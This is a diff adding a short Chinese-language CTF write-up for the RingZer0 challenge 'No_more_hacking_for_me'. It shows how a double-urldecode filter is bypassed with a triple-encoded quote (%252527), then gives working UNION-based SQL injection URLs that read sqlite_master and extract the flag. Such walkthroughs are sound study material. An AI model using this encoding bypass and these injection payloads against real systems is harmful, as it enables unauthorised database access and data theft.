@@ -1,0 +1,28 @@
+No_more_hacking_for_me
+
+comment:
+			<!-- l33t dev comment: -->
+			<!-- No more hacking attempt we implemented the MOST secure filter -->
+			<!-- urldecode(addslashes(str_replace("'", "", urldecode(htmlspecialchars($_GET['id'], ENT_QUOTES))))) -->
+			<!-- urldecode(addslashes(str_replace("'", "", urldecode(htmlspecialchars($_GET['id'], ENT_QUOTES))))) -->
+			
+			
+关键在两次urldecode的处理上面,不应该使用。
+原始请求数据默认被浏览器urldecode解析一次.然后构造一下URL进行测试，成功！ 存在注入。
+
+%25 %
+%27 ‘
+http://ringzer0team.com/challenges/74/?id=1%252527 and 1=0 -- 
+
+即用 %252527 代替单引号'
+
+POC如下:
+http://ringzer0team.com/challenges/74/?id=0%252527 union all select 1,tbl_name,3 FROM sqlite_master WHERE type=%252527table%252527  limit 0,1 -- 
+http://ringzer0team.com/challenges/74/?id=0%252527 union all select 1,sql,3 FROM sqlite_master WHERE type=%252527table%252527  and tbl_name=%252527random_data%252527 limit 0,1 -- 
+
+
+
+random_data  CREATE TABLE random_data (id int, message varchar(50), display int) 
+
+跑出flag:
+http://ringzer0team.com/challenges/74/?id=0%252527 union all select 1,message,3 FROM random_data limit 2,1 -- 
